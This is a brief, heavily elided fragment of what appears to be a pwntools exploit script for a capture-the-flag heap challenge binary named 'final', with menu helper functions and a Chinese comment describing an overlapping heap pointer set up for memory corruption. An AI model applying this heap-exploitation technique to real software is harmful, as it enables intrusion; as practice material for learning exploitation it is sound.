...
r = process('./final')
# r = gdb.debug('./final', level='debug', gdbscript='''
# b 142
# ''')
...
def buy(idx, nlen, name):
    ...
    log.info(f"Buy {name} with size {hex(nlen)} at {idx}")

def release(idx):
    r.sendlineafter('> ', '2')
    r.sendlineafter('which one to release (0 or 1) ?\n> ', str(idx))
    log.info(f"Release {idx}")
...
if sys.argv[1] == '1':
    ...
    buy(1, 0x10, 'dummy')
    # 3. 此時 animals[0] 可以寫 0x10000 大小的資料，並且 name 指向 heap+0xbe0(animals[1])，
